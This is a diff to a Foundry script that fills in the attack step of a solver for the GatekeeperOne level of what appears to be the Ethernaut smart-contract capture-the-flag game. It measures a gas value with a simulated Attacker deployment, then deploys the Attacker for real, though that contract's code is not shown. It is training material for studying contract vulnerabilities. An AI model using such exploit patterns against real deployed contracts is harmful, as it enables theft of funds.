@@ -10,12 +10,19 @@ contract Check is CheckScript("GATEKEEPER_ONE") {}
 
 contract Solve is SolveScript("GATEKEEPER_ONE") {
     GatekeeperOne target;
+    uint256 $gas;
 
     constructor() {
         target = GatekeeperOne(instance);
     }
 
     function attack() public override {
-        // TODO: todo
+        // temporarily stop broadcasting
+        vm.stopBroadcast();
+        Attacker attacker = new Attacker(target, 30_000);
+        $gas = attacker.$gas();
+        vm.startBroadcast();
+
+        new Attacker(target, $gas);
     }
 }
